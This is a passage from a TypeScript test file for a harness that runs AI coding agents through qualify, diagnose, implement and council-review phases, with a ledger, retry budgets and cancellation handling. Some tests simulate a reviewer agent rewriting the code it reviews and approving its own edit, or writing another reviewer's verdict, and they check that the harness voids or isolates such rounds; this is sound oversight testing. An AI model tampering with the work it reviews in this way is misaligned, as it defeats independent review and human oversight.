      writeFileSync(req.resultPath, JSON.stringify({ outcome: 'no_action', evidence: 'not reproduced' }));
      return null;
    });
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const ledger = loadLedger(first.host.dataDir, first.host.runId)!;
    ledger.pendingMessages.push({
      id: 'new-evidence',
      text: 'The failure reproduces with an empty queue.',
      createdAt: new Date().toISOString(),
    });
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id))
      .toEqual(['qualify', 'diagnose', 'implement', 'review']);
    expect(loadLedger(first.host.dataDir, first.host.runId)?.pendingMessages[0])
      .toMatchObject({ consumedByPhaseId: 'qualify', consumedAt: expect.any(String) });
  });

  it('preserves a message authored mid-phase and delivers it only to the next phase', async () => {
    const h = makeHarness(dir);
    let diagnosePrompt = '';
    h.agentBehavior.set('qualify', (req) => {
      const external = loadLedger(h.host.dataDir, h.host.runId);
      if (!external) throw new Error('expected the running ledger');
      external.pendingMessages.push({
        id: 'mid-phase-message',
        text: 'Also preserve the compatibility alias.',
        createdAt: '2026-07-26T10:01:00.000Z',
      });
      saveLedger(h.host.dataDir, h.host.runId, external);
      writeFileSync(
        req.resultPath,
        JSON.stringify({ outcome: 'work_needed', evidence: 'bug reproduced on main' }),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('diagnose', (req) => {
      diagnosePrompt = req.prompt;
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'root cause', files: ['src/fix.ts'] }),
        'utf8',
      );
      return null;
    });

    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();

    expect(diagnosePrompt).toContain('[mid-phase-message] Also preserve the compatibility alias.');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.pendingMessages[0]).toMatchObject({
      consumedAt: expect.any(String),
      consumedByPhaseId: 'diagnose',
    });
  });

  it('reconciles an assigned message after phase completion without delivering it twice', async () => {
    const first = makeHarness(dir);
    const ledger = createLedger({
      workflow: HARNESS_FIX_ISSUE,
      requestedProfile: 'standard',
      skillProfile: 'open-mercato',
      subject: { kind: 'issue', id: '642', text: input.task },
    });
    ledger.pendingMessages.push({
      id: 'completion-crash-message',
      text: 'Preserve the compatibility alias.',
      createdAt: '2026-07-26T10:02:00.000Z',
    });
    saveLedger(first.host.dataDir, first.host.runId, ledger);
    expect(await runHarnessDriver(first.host, input, first.deps)).toBeNull();
    const crashed = loadLedger(first.host.dataDir, first.host.runId)!;
    const message = crashed.pendingMessages[0]!;
    expect(message.assignedToPhaseId).toBe('qualify');
    message.consumedAt = undefined;
    message.consumedByPhaseId = undefined;
    saveLedger(first.host.dataDir, first.host.runId, crashed);

    const resumed = makeHarness(dir);
    let diagnosePrompt = '';
    resumed.agentBehavior.set('diagnose', (req) => {
      diagnosePrompt = req.prompt;
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'root cause', files: ['src/fix.ts'] }),
        'utf8',
      );
      return null;
    });
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
    expect(diagnosePrompt).not.toContain('completion-crash-message');
    expect(loadLedger(resumed.host.dataDir, resumed.host.runId)?.pendingMessages[0]).toMatchObject({
      assignedToPhaseId: 'qualify',
      consumedByPhaseId: 'qualify',
      consumedAt: expect.any(String),
    });
  });

  it('delivers a message authored during validation to the next review council', async () => {
    const h = makeHarness(dir);
    h.deps.loadAgentic = async () => ({
      baseBranch: 'main',
      validationCommands: ['echo ok'],
      agentHarness: {
        models: {
          codex: {
            family: 'openai',
            model: 'gpt-5.6-sol',
            roles: ['reviewer'],
            adapter: 'preset',
          },
          deepseek: {
            family: 'deepseek',
            model: 'deepseek-v4-pro',
            roles: ['reviewer'],
            adapter: 'preset',
          },
        },
      },
    });
    let validateCalls = 0;
    h.deps.validate = async (commands) => {
      validateCalls += 1;
      if (validateCalls > 1) {
        const external = loadLedger(h.host.dataDir, h.host.runId)!;
        if (!external.pendingMessages.some((message) => message.id === 'during-validation')) {
          external.pendingMessages.push({
            id: 'during-validation',
            text: 'Confirm the compatibility alias in council.',
            createdAt: '2026-07-26T10:03:00.000Z',
          });
          saveLedger(h.host.dataDir, h.host.runId, external);
        }
      }
      return commands.map((command) => ({
        command,
        status: 'passed' as const,
        exitCode: 0,
        evidence: 'ok',
      }));
    };

    expect(
      await runHarnessDriver(h.host, {
        ...input,
        profile: 'multi',
        roles: {
          orchestrator: { runner: 'claude', model: '' },
          implementer: { runner: 'claude', model: '' },
          reviewers: [
            { runner: 'harness', model: 'codex', family: 'openai' },
            { runner: 'harness', model: 'deepseek', family: 'deepseek' },
          ],
        },
      }, h.deps),
    ).toBeNull();

    const criteria = readFileSync(
      join(
        harnessArtifactDir(h.host.dataDir, h.host.runId),
        'council-criteria-impl-r1.md',
      ),
      'utf8',
    );
    expect(criteria).toContain('[during-validation] Confirm the compatibility alias in council.');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.pendingMessages[0]).toMatchObject({
      assignedToPhaseId: 'review',
      consumedByPhaseId: 'review',
      consumedAt: expect.any(String),
    });
  });

  it('fails closed on a corrupt ledger without invoking a model or operation', async () => {
    const h = makeHarness(dir);
    const path = join(h.host.dataDir, 'runs', `${h.host.runId}.harness.json`);
    writeFileSync(path, '{ interrupted write', 'utf8');

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/recovery blocked.*corrupt/i);
    expect(h.calls).toEqual([]);
    expect(readFileSync(path, 'utf8')).toBe('{ interrupted write');
  });

  it('fails closed on a future ledger without invoking a model or operation', async () => {
    const h = makeHarness(dir);
    const path = join(h.host.dataDir, 'runs', `${h.host.runId}.harness.json`);
    writeFileSync(path, JSON.stringify({ version: 999, workflow: HARNESS_FIX_ISSUE }), 'utf8');

    const error = await runHarnessDriver(h.host, input, h.deps);

    expect(error).toMatch(/recovery blocked.*version 999/i);
    expect(h.calls).toEqual([]);
  });

  // a Stop or a crash ends no attempt, so it must not spend the retry budget.
  // a usage limit or runner error spent the budget, so after two
  // every resume failed at once and auto-resume stopped re-arming.
  it('does not charge runner failures like a usage limit to the two-attempt budget', async () => {
    let implementCalls = 0;
    const entry = () => {
      const h = makeHarness(dir);
      h.agentBehavior.set('implement', (req) => {
        implementCalls += 1;
        if (implementCalls <= 2) return 'claude CLI exited with code 1 — usage limit reached, resets at 5pm';
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
        return null;
      });
      return h;
    };
    for (let limited = 0; limited < 2; limited += 1) {
      const h = entry();
      expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/usage limit/);
    }
    const resumed = entry();

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(implementCalls).toBe(3);
    expect(loadLedger(resumed.host.dataDir, resumed.host.runId)?.stage.status).toBe('staged');
  });

  it('does not charge cancelled implement attempts to the two-attempt budget', async () => {
    let cancelled = false;
    let implementCalls = 0;
    const entry = () => {
      const h = makeHarness(dir);
      h.host.isCancelled = () => cancelled;
      h.agentBehavior.set('implement', (req) => {
        implementCalls += 1;
        if (implementCalls <= 2) {
          cancelled = true;
          return null;
        }
        writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
        return null;
      });
      return h;
    };
    for (let stop = 0; stop < 2; stop += 1) {
      cancelled = false;
      const h = entry();
      expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    }
    cancelled = false;
    const resumed = entry();

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(implementCalls).toBe(3);
    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(ledger?.stage.status).toBe('staged');
    expect(
      ledger?.invocations.find((invocation) => invocation.phaseId === 'implement'),
    ).toMatchObject({ status: 'completed', attempt: 1 });
  });

  it('does not charge attempts cut short by a process crash to the budget', async () => {
    let implementCalls = 0;
    for (let crash = 0; crash < 2; crash += 1) {
      let cancelled = false;
      const h = makeHarness(dir);
      h.host.isCancelled = () => cancelled;
      h.agentBehavior.set('implement', () => {
        implementCalls += 1;
        cancelled = true;
        return null;
      });
      expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
      const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
      const implement = ledger.invocations.find((invocation) => invocation.phaseId === 'implement')!;
      implement.status = 'running';
      implement.error = undefined;
      implement.endedAt = undefined;
      saveLedger(h.host.dataDir, h.host.runId, ledger);
    }
    const resumed = makeHarness(dir);
    resumed.agentBehavior.set('implement', (req) => {
      implementCalls += 1;
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
      return null;
    });

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    expect(implementCalls).toBe(3);
    expect(loadLedger(resumed.host.dataDir, resumed.host.runId)?.stage.status).toBe('staged');
  });

  // The ended attempts still count (D5); a Continue after both buys one more
  // instead of re-returning the failure without a model call.
  it('gives a phase whose two ended attempts broke the result contract one more attempt per Continue', async () => {
    const first = makeHarness(dir);
    first.agentBehavior.set('implement', (req) => {
      writeFileSync(req.resultPath, '{"not":"the contract"}', 'utf8');
      return null;
    });
    expect(await runHarnessDriver(first.host, input, first.deps)).toMatch(
      /"implement" produced no valid result after a retry/,
    );
    const resumed = makeHarness(dir);
    const implementPrompts: string[] = [];
    resumed.agentBehavior.set('implement', (req) => {
      implementPrompts.push(req.prompt);
      return null;
    });

    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toMatch(
      /"implement" produced no valid result after a retry/,
    );
    expect(implementPrompts).toHaveLength(1);
    expect(implementPrompts[0]).toContain('RESULT-CONTRACT RETRY');
  });

  // staging promotes only a pending outcome, so a stale block meant publish 409'd forever.
  it('clears a transient blocked outcome when a resume stages cleanly', async () => {
    const first = makeHarness(dir);
    const fakeRuntime = first.deps.createRuntime!;
    first.deps.createRuntime = (opts) => {
      const runtime = fakeRuntime(opts);
      return {
        kill: () => runtime.kill(),
        run: async (op, args, runOpts) =>
          op === 'stage'
            ? { ok: false, exitCode: 1, stdout: '', stderr: 'index.lock exists', durationMs: 1 }
            : runtime.run(op, args, runOpts),
      };
    };
    expect(await runHarnessDriver(first.host, input, first.deps)).toMatch(/stage refused the handoff/);
    expect(loadLedger(first.host.dataDir, first.host.runId)?.outcome.status).toBe('blocked');

    const resumed = makeHarness(dir);
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();

    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(ledger?.stage.status).toBe('staged');
    expect(ledger?.outcome).toMatchObject({ status: 'ready', blockingReasons: [] });
  });

  it('returns null without staging when cancelled between phases', async () => {
    const h = makeHarness(dir);
    let cancelled = false;
    h.host.isCancelled = () => cancelled;
    h.agentBehavior.set('diagnose', (req) => {
      cancelled = true;
      writeFileSync(req.resultPath, JSON.stringify({ summary: 's', files: [] }), 'utf8');
      return null;
    });
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    expect(h.calls.map((c) => c.id)).not.toContain('implement');
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
        (invocation) => invocation.phaseId === 'diagnose',
      ),
    ).toMatchObject({ status: 'interrupted', error: 'run cancelled' });
  });
});

describe('harness driver — role-based conduction (2026-07-24)', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'cez-driver-roles-'));
    mkdirSync(join(dir, '.ai/cezar/runs'), { recursive: true });
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  const roles = {
    orchestrator: { runner: 'claude' as const, model: 'sonnet' },
    implementer: { runner: 'codex' as const, model: 'gpt-5.6-sol', effort: 'max' as const },
    reviewers: [
      { runner: 'claude' as const, model: 'opus' },
      { runner: 'codex' as const, model: '' },
    ],
  };

  const input = {
    workflow: HARNESS_FIX_ISSUE,
    task: 'Fix issue #642',
    profile: 'standard' as const,
    skillProfile: 'open-mercato' as const,
    issueId: '642',
    roles,
  };

  const phaseDefaults: Record<string, unknown> = {
    qualify: { outcome: 'work_needed', evidence: 'bug reproduced on main' },
    diagnose: { summary: 'race', files: ['src/a.ts'], regressionTest: 't' },
    implement: { changedPaths: ['src/a.ts'], suggestedCommit: 'fix: x' },
  };

  it.each([true, false])('%s [round3-1] macrotask Stop during council sizing prevents advisor spawn', async (cancelDuringSizing) => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    writeFileSync(join(dir, 'base.txt'), 'base');
    git('add', 'base.txt');
    git('commit', '-qm', 'base');
    pinWorktreeGitDir(dir, join(dir, '.git'));
    const h = makeHarness(dir);
    let cancelled = false;
    let scheduled = false;
    const interrupts = new Set<() => void>();
    const launches: string[] = [];
    h.host.isCancelled = () => cancelled;
    h.host.onInterrupt = (fn) => { interrupts.add(fn); return () => { interrupts.delete(fn); }; };
    h.deps.snapshotReviewSubject = async () => {
      if (cancelDuringSizing && !scheduled && h.steps.get('review') === 'running') {
        scheduled = true;
        setImmediate(() => { cancelled = true; for (const fn of interrupts) fn(); });
      }
      return 'stable-review-subject';
    };
    const create = h.deps.createRuntime!;
    h.deps.createRuntime = (opts) => {
      const runtime = create(opts);
      return { run: async (op, args, options) => {
        if (op === 'review') launches.push(`spawn review (cancelled=${cancelled})`);
        return runtime.run(op, args, options);
      }, kill: () => { launches.push(`kill (cancelled=${cancelled})`); runtime.kill(); } };
    };
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    if (cancelDuringSizing) {
      expect(scheduled).toBe(true);
      expect(launches).toContain('kill (cancelled=true)');
      expect(launches.filter((entry) => entry.startsWith('spawn'))).toEqual([]);
    } else {
      expect(launches).toContain('spawn review (cancelled=false)');
    }
  });

  it('guard: an uncancelled advisor council still runs', async () => {
    const h = makeHarness(dir);
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(h.ops.filter((op) => op.id === 'review')).toHaveLength(1);
  });

  it.each(['rows', 'op-error', 'throw'])('[round2-5] leaves advisor usage-limit windows unspent (%s)', async (mode) => {
    const h = makeHarness(dir);
    let windows = 0;
    h.setCouncilBehavior((ids) => {
      windows += 1;
      if (windows > 2) return undefined;
      if (mode === 'throw') throw new Error('provider usage limit reached');
      return mode === 'op-error' ? { ok: false, stderr: 'provider usage limit reached' } : {
        ok: true, result: { reviewers: ids.map((id) => ({ id, status: 'failed', error: 'provider usage limit reached' })) },
      };
    });
    for (let window = 0; window < 2; window += 1) {
      expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/quorum/);
      expect(loadLedger(h.host.dataDir, h.host.runId)?.invocations.filter((row) => row.id.startsWith('advisor:')).at(-1)?.status).toBe('interrupted');
    }
    expect(await runHarnessDriver(h.host, input, h.deps)).toBeNull();
    expect(windows).toBe(3);
  });

  it('guard: a permanent advisor failure still spends the bounded retry budget', async () => {
    const h = makeHarness(dir);
    let calls = 0;
    h.setCouncilBehavior((ids) => {
      calls += 1;
      return { ok: true, result: { reviewers: ids.map((id) => ({ id, status: 'failed', error: 'invalid provider configuration' })) } };
    });
    expect(await runHarnessDriver(h.host, input, h.deps)).toMatch(/quorum/);
    expect(calls).toBe(2);
    const advisor = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find((row) => row.id.startsWith('advisor:'));
    expect(advisor).toMatchObject({ status: 'failed', attempt: 2 });
  });

  it('guard: reads a real verbose multi-advisor result larger than two MB', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    mkdirSync(join(dir, 'src/runs'), { recursive: true });
    writeFileSync(join(dir, 'src/runs/store.ts'), 'base\n');
    git('add', 'src');
    git('commit', '-qm', 'base');
    pinWorktreeGitDir(dir, join(dir, '.git'));
    writeFileSync(join(dir, '.git/info/exclude'), '.ai/cezar/\n.claude/\n');
    const h = makeHarness(dir);
    h.agentBehavior.set('implement', (req) => {
      writeFileSync(join(dir, 'src/runs/store.ts'), 'implementation\n');
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/runs/store.ts'] }));
      return null;
    });
    const command = join(dir, '.ai/cezar/reviewer.cjs');
    writeFileSync(command, `process.stdin.resume(); process.stdin.on('end', () => process.stdout.write(JSON.stringify({ verdict: 'approve', notes: [], findings: Array.from({length: 10}, (_, i) => ({severity: 'minor', category: 'quality', title: 'finding ' + i, location: {path: 'src/runs/store.ts'}, evidence: 'e'.repeat(70000), impact: 'cosmetic', remediation: 'consider', confidence: 1})) })));`);
    const create = h.deps.createRuntime!;
    const script = new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname;
    let resultBytes = 0;
    h.deps.createRuntime = (opts) => {
      const fake = create(opts);
      return { ...fake, run: async (op, args, options) => {
        if (op !== 'review') return fake.run(op, args, options);
        const configPath = args[args.indexOf('--config') + 1]!;
        const cfg = JSON.parse(readFileSync(configPath, 'utf8'));
        for (const model of Object.values(cfg.agentHarness.models) as Array<Record<string, unknown>>) {
          model.adapter = 'command';
          model.commands = { review: [process.execPath, command] };
        }
        writeFileSync(configPath, JSON.stringify(cfg));
        const real = spawnSync(process.execPath, [script, op, ...args], {
          cwd: dir, encoding: 'utf8', env: { ...process.env, CEZ_HARNESS_REVIEW_SKILL: 'cez-code-review' },
        });
        const resultPath = join(args[args.indexOf('--output-dir') + 1]!, 'review-result.json');
        if (existsSync(resultPath)) resultBytes = readFileSync(resultPath).length;
        return { ok: real.status === 0, exitCode: real.status ?? 1, stdout: real.stdout, stderr: real.stderr, durationMs: 0 };
      } };
    };
    const verboseInput = { ...input, roles: { ...roles, reviewers: [
      { runner: 'claude' as const, model: 'opus' },
      { runner: 'codex' as const, model: 'gpt-5.6-sol' },
      { runner: 'codex' as const, model: 'gpt-5.5-mini' },
    ] } };
    const error = await runHarnessDriver(h.host, verboseInput, h.deps);
    expect(resultBytes, error ?? undefined).toBeGreaterThan(2_000_000);
    expect(error).toBeNull();
    expect(loadLedger(h.host.dataDir, h.host.runId)?.invocations.filter((row) => row.id.startsWith('advisor:')).map((row) => row.status)).toEqual(['completed', 'completed']);
  }, 15_000);

  it('[round2-7] bounds open spec questions and preserves their full artifact', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai/specs'), { recursive: true });
      writeFileSync(join(dir, '.ai/specs/feature.md'), '# feature');
      writeFileSync(req.resultPath, JSON.stringify({ summary: 'feature', specPath: '.ai/specs/feature.md',
        openQuestions: Array.from({ length: 50 }, (_, i) => `question ${i} ${'界'.repeat(1_200)}`),
      }));
      return null;
    });
    let prompt = '';
    h.agentBehavior.set('review', (req) => {
      prompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }));
      return null;
    });
    expect(await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps)).toBeNull();
    expect(Buffer.byteLength(prompt)).toBeLessThan(180_000);
    const artifact = join(harnessArtifactDir(h.host.dataDir, h.host.runId), 'findings-prior-rounds.json');
    expect(prompt).toContain(artifact);
    expect(JSON.parse(readFileSync(artifact, 'utf8')).unresolvedSpecFindings).toHaveLength(50);
  });

  it.each([['guard: short review history preserves earlier requirements', false], ['[round2-7] bounds resumed history for session prompts and advisor criteria', true]] as const)('%s', async (_name, large) => {
    const h = makeHarness(dir);
    let stopped = false;
    h.host.isCancelled = () => stopped;
    h.agentBehavior.set('review', () => { stopped = true; return 'stopped'; });
    await runHarnessDriver(h.host, input, h.deps);
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    if (!ledger.rounds?.implementation) throw new Error('missing implementation checkpoint');
    ledger.rounds.implementation.history = [{
      round: 1,
      demanded: large ? Array.from({ length: 200 }, (_, i) => `[major] demand ${i} ${'界'.repeat(800)}`) : ['[blocker] keep the invariant'],
      response: large ? 'response '.repeat(30_000) : 'the fix preserves the invariant',
    }];
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    const resumed = makeHarness(dir);
    let prompt = '';
    let criteria = '';
    resumed.agentBehavior.set('review', (req) => {
      prompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }));
      return null;
    });
    const create = resumed.deps.createRuntime!;
    resumed.deps.createRuntime = (opts) => {
      const fake = create(opts);
      return { ...fake, run: async (op, args, options) => {
        if (op === 'review') criteria = readFileSync(args[args.indexOf('--criteria-file') + 1]!, 'utf8');
        return fake.run(op, args, options);
      } };
    };
    expect(await runHarnessDriver(resumed.host, input, resumed.deps)).toBeNull();
    for (const text of [prompt, criteria]) {
      expect(Buffer.byteLength(text)).toBeLessThan(180_000);
      expect(text).toContain(large ? 'findings-prior-rounds.json' : 'keep the invariant');
      expect(text.toLowerCase()).toContain('earlier');
      if (!large) expect(text).toContain('the fix preserves the invariant');
    }
    if (large) {
      const artifact = join(harnessArtifactDir(resumed.host.dataDir, resumed.host.runId), 'findings-prior-rounds.json');
      expect(JSON.parse(readFileSync(artifact, 'utf8')).roundHistory[0].demanded).toHaveLength(200);
      expect(readFileSync(artifact, 'utf8')).toContain('界'.repeat(800));
    }
  });

  it('routes each phase to its role model, and reviews through structured calls', async () => {
    const h = makeHarness(dir);
    const seen: Array<{ id: string; runner?: string; model?: string }> = [];
    for (const phase of ['qualify', 'diagnose', 'implement']) {
      h.agentBehavior.set(phase, (req) => {
        seen.push({ id: req.phaseId, runner: req.runner, model: req.model });
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }

    const error = await runHarnessDriver(h.host, { ...input, roles }, h.deps);

    expect(error).toBeNull();
    expect(seen.find((s) => s.id === 'qualify')?.runner).toBe('claude');
    expect(seen.find((s) => s.id === 'implement')?.runner).toBe('codex');
    expect(h.calls.filter((c) => c.kind === 'agent' && c.id === 'review')).toHaveLength(1);
    expect(h.ops.some((o) => o.id === 'review')).toBe(true);
  });

  // a phase that left a directory at its result path made the retry's cleanup throw
  // EISDIR out of the driver, and every Continue crashed the run the same way.
  it.each(['qualify', 'review'])('retries a %s attempt that left a directory at its result path', async (planted) => {
    const h = makeHarness(dir);
    const attempts = new Map<string, number>();
    for (const phase of ['qualify', 'diagnose', 'implement', 'review']) {
      h.agentBehavior.set(phase, (req) => {
        const attempt = (attempts.get(phase) ?? 0) + 1;
        attempts.set(phase, attempt);
        if (phase === planted && attempt === 1) {
          mkdirSync(join(req.resultPath, 'nested'), { recursive: true });
          writeFileSync(join(req.resultPath, 'nested', 'result.json'), '{}', 'utf8');
          return null;
        }
        const result = phase === 'review' ? { verdict: 'approve', findings: [] } : phaseDefaults[phase];
        writeFileSync(req.resultPath, JSON.stringify(result), 'utf8');
        return null;
      });
    }

    expect(await runHarnessDriver(h.host, { ...input, roles }, h.deps)).toBeNull();
    expect(attempts.get(planted)).toBe(2);
  });

  // every reviewer shared one writable output root with predictable result names,
  // so one reviewer could write another's verdict.
  it('gives each council reviewer its own writable output directory', async () => {
    const h = makeHarness(dir);
    for (const phase of ['qualify', 'diagnose', 'implement']) {
      h.agentBehavior.set(phase, (req) => {
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }
    const sessions: Array<{ outputDir?: string; resultPath: string }> = [];
    h.agentBehavior.set('review', (req) => {
      sessions.push({ outputDir: req.env?.CEZ_HARNESS_OUTPUT_DIR, resultPath: req.resultPath });
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });
    const reviewers = [
      { runner: 'claude' as const, model: 'opus' },
      { runner: 'claude' as const, model: 'sonnet' },
      { runner: 'codex' as const, model: '' },
    ];

    expect(await runHarnessDriver(h.host, { ...input, roles: { ...roles, reviewers } }, h.deps)).toBeNull();
    expect(sessions).toHaveLength(2);
    for (const session of sessions) expect(dirname(session.resultPath)).toBe(session.outputDir);
    expect(new Set(sessions.map((session) => session.outputDir)).size).toBe(2);
  });

  // one reviewer that threw rejected the council pool, so the driver unwound while
  // its sibling's session ran on, unstoppable and billing.
  it('fails a council reviewer that throws alone, after its sibling session settles', async () => {
    const h = makeHarness(dir);
    for (const phase of ['qualify', 'diagnose', 'implement']) {
      h.agentBehavior.set(phase, (req) => {
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }
    let siblingSettled = false;
    h.agentBehavior.set('review', async (req) => {
      if (req.model === 'sonnet') throw new Error('ENOSPC: no space left on device');
      await new Promise((resolve) => setTimeout(resolve, 50));
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      siblingSettled = true;
      return null;
    });
    const reviewers = [
      { runner: 'claude' as const, model: 'opus' },
      { runner: 'claude' as const, model: 'sonnet' },
      { runner: 'codex' as const, model: '' },
    ];

    expect(await runHarnessDriver(h.host, { ...input, roles: { ...roles, reviewers } }, h.deps)).toBeNull();
    expect(siblingSettled).toBe(true);
    const thrown = loadLedger(h.host.dataDir, h.host.runId)?.invocations.find(
      (invocation) => invocation.reviewerId === 'claude/sonnet',
    );
    expect(thrown).toMatchObject({ status: 'failed', error: expect.stringContaining('ENOSPC') });
  });

  // a usage limit spent both reviewer attempts at once (attempt 2 fired into the same
  // closed window), so the auto-resume at reset ran no reviewer and the run stayed parked.
  it('leaves a usage-limited reviewer unspent, so the resume at reset runs it again', async () => {
    const h = makeHarness(dir);
    for (const phase of ['qualify', 'diagnose', 'implement']) {
      h.agentBehavior.set(phase, (req) => {
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }
    let limited = true;
    let reviewerAttempts = 0;
    h.agentBehavior.set('review', (req) => {
      reviewerAttempts += 1;
      if (limited) return `Claude AI usage limit reached|${Math.floor(Date.now() / 1000) + 3600}`;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });

    expect(await runHarnessDriver(h.host, { ...input, roles }, h.deps)).toMatch(/quorum/);
    expect(reviewerAttempts).toBe(1);

    limited = false;
    expect(await runHarnessDriver(h.host, { ...input, roles }, h.deps)).toBeNull();
    expect(reviewerAttempts).toBe(2);
  });

  // the mutating attempt was retried, attempt 2 approved its own edit, and the
  // edit staged as `ready` on a review the rest of the council never saw.
  it('voids a council round a reviewer edited instead of retrying it into a staged result', async () => {
    const h = makeHarness(dir);
    for (const phase of ['qualify', 'diagnose', 'implement']) {
      h.agentBehavior.set(phase, (req) => {
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }
    const file = join(dir, 'src', 'a.ts');
    h.deps.snapshotReviewSubject = async () => {
      try {
        return createHash('sha256').update(readFileSync(file)).digest('hex');
      } catch {
        return 'untouched';
      }
    };
    let reviewerAttempts = 0;
    h.agentBehavior.set('review', (req) => {
      reviewerAttempts += 1;
      if (reviewerAttempts === 1) {
        mkdirSync(dirname(file), { recursive: true });
        writeFileSync(file, 'the reviewer rewrote this\n', 'utf8');
      }
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, { ...input, roles }, h.deps);

    expect(error).toMatch(/review subject changed during the council, so this round is void/);
    expect(reviewerAttempts).toBe(1);
    expect(h.calls.map((call) => call.id)).not.toContain('stage');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.stage.status).not.toBe('staged');
  });

  it('runs a Codex and gateway lineup when the optional Claude sandbox is unavailable', async () => {
    const guard = vi.spyOn(claudeGuard, 'createClaudeStageOnlySettings').mockImplementation(() => {
      throw new Error('optional Claude sandbox is unavailable');
    });
    try {
      const h = makeHarness(dir);
      const error = await runHarnessDriver(h.host, {
        ...input,
        roles: {
          orchestrator: { runner: 'codex', model: 'gpt-5.6-sol' },
          implementer: roles.implementer,
          reviewers: [
            { runner: 'codex', model: 'gpt-5.6-sol' },
            { runner: 'opencode', model: 'opencode/mimo-v2.5-free' },
          ],
        },
      }, h.deps);

      expect(error).toBeNull();
      expect(guard).not.toHaveBeenCalled();
      expect(loadLedger(h.host.dataDir, h.host.runId)?.stage.status).toBe('staged');
    } finally {
      guard.mockRestore();
    }
  });

  it('fails the Claude phase cleanly before invoking an agent when its sandbox is unavailable', async () => {
    const guard = vi.spyOn(claudeGuard, 'createClaudeStageOnlySettings').mockImplementation(() => {
      throw new Error('optional Claude sandbox is unavailable');
    });
    try {
      const h = makeHarness(dir);
      await expect(runHarnessDriver(h.host, input, h.deps)).resolves.toMatch(
        /Claude stage-only sandbox unavailable.*optional Claude sandbox is unavailable/,
      );
      expect(h.calls.filter((call) => call.kind === 'agent')).toHaveLength(0);
      expect(loadLedger(h.host.dataDir, h.host.runId)?.phases.find((phase) => phase.id === 'qualify'))
        .toMatchObject({ status: 'failed' });
    } finally {
      guard.mockRestore();
    }
  });

  /**
   * Review finding (2026-07-27): `family` was populated for advisor refs only,
   * so every reviewer in a role lineup reached the ledger — and the Review tab's
   * Family column — with nothing in it. That column is the evidence for the
   * council's independence claim, so an empty one makes the claim unverifiable.
   */
  it('records the provider family and the ref parts for every roster model', async () => {
    const h = makeHarness(dir);
    for (const phase of ['qualify', 'diagnose', 'implement']) {
